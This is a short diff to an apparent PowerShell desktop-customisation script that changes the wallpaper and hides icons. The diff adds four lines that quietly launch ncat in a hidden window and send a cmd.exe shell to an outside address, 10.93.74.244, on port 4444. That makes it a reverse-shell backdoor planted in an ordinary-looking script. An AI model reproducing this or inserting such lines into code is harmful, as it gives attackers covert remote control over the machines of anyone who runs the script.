@@ -68,3 +68,7 @@ public class Wallpaper {
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideIcons" -Value 1
 Stop-Process -Name explorer -Force
 Start-Process explorer.exe
+
+# Reverse shell
+$Ncat = "C:\Program Files (x86)\Nmap\ncat.exe"
+Start-Process -FilePath $Ncat -ArgumentList "10.93.74.244 4444 -e cmd.exe" -WindowStyle Hidden
